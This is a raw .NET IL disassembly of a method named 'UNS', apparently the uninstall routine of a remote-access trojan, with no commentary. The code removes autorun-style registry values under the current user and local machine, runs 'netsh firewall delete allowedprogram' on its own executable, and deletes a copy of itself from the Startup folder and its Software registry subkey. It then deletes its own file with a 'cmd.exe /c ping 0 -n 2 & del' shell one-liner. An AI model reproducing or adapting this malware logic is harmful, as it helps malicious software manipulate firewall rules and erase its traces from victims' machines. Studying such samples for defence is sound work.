  .method public static void  UNS() cil managed
  {
    // Code size       343 (0x157)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  ldc.i4.0
    IL_0001:  call       void j.OK::pr(int32)
    IL_0006:  ldc.i4.0
    IL_0007:  stsfld     bool j.OK::Isu
    .try
    {
      IL_000c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0011:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0016:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_001b:  ldsfld     string j.OK::sf
      IL_0020:  ldc.i4.1
      IL_0021:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0026:  ldsfld     string j.OK::RG
      IL_002b:  ldc.i4.0
      IL_002c:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0031:  leave.s    IL_0041

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0033:  dup
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  stloc.0
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003f:  leave.s    IL_0041

    }  // end handler
    .try
    {
      IL_0041:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0046:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_004b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0050:  ldsfld     string j.OK::sf
      IL_0055:  ldc.i4.1
      IL_0056:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_005b:  ldsfld     string j.OK::RG
      IL_0060:  ldc.i4.0
      IL_0061:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0066:  leave.s    IL_0076

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0068:  dup
      IL_0069:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006e:  stloc.1
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    .try
    {
      IL_0076:  ldstr      "netsh firewall delete allowedprogram \""
      IL_007b:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0080:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0085:  ldstr      "\""
      IL_008a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_008f:  ldc.i4.0
      IL_0090:  ldc.i4.0
      IL_0091:  ldc.i4.m1
      IL_0092:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0097:  pop
      IL_0098:  leave.s    IL_00a8

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_009a:  dup
      IL_009b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a0:  stloc.2
      IL_00a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00a6:  leave.s    IL_00a8

    }  // end handler
    .try
    {
      IL_00a8:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_00ad:  brfalse.s  IL_00d8

      IL_00af:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_00b4:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_00b9:  ldc.i4.7
      IL_00ba:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_00bf:  ldstr      "\\"
      IL_00c4:  ldsfld     string j.OK::RG
      IL_00c9:  ldstr      ".exe"
      IL_00ce:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_00d3:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_00d8:  leave.s    IL_00e8

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00da:  dup
      IL_00db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e0:  stloc.3
      IL_00e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e6:  leave.s    IL_00e8

    }  // end handler
    .try
    {
      IL_00e8:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_00ed:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00f2:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_00f7:  ldstr      "Software"
      IL_00fc:  ldc.i4.1
      IL_00fd:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0102:  ldsfld     string j.OK::RG
      IL_0107:  ldc.i4.0
      IL_0108:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_010d:  leave.s    IL_011e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_010f:  dup
      IL_0110:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0115:  stloc.s    V_4
      IL_0117:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011c:  leave.s    IL_011e

    }  // end handler
    .try
    {
      IL_011e:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_0123:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0128:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_012d:  ldstr      "\""
      IL_0132:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0137:  ldc.i4.0
      IL_0138:  ldc.i4.0
      IL_0139:  ldc.i4.m1
      IL_013a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_013f:  pop
      IL_0140:  leave.s    IL_0151

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0142:  dup
      IL_0143:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0148:  stloc.s    V_5
      IL_014a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014f:  leave.s    IL_0151

    }  // end handler
    IL_0151:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0156:  ret
  } // end of method OK::UNS
